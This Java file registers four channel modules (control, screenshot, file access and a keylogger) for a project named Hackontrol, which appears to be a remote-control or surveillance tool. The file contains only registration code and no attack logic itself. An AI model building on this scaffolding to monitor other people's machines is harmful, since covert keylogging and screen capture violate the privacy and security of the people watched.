package com.khopan.hackontrol.registration;

import com.khopan.hackontrol.Hackontrol;
import com.khopan.hackontrol.channel.ControlChannel;
import com.khopan.hackontrol.channel.ScreenshotChannel;
import com.khopan.hackontrol.channel.file.FileChannel;
import com.khopan.hackontrol.channel.keylogger.KeyLoggerChannel;
import com.khopan.hackontrol.registry.Registry;

public class ChannelRegistry {
	private ChannelRegistry() {}

	public static void register(Registry registry) {
		registry.register(Hackontrol.CHANNEL_REGISTRY, ControlChannel.class);
		registry.register(Hackontrol.CHANNEL_REGISTRY, ScreenshotChannel.class);
		registry.register(Hackontrol.CHANNEL_REGISTRY, FileChannel.class);
		registry.register(Hackontrol.CHANNEL_REGISTRY, KeyLoggerChannel.class);
	}
}
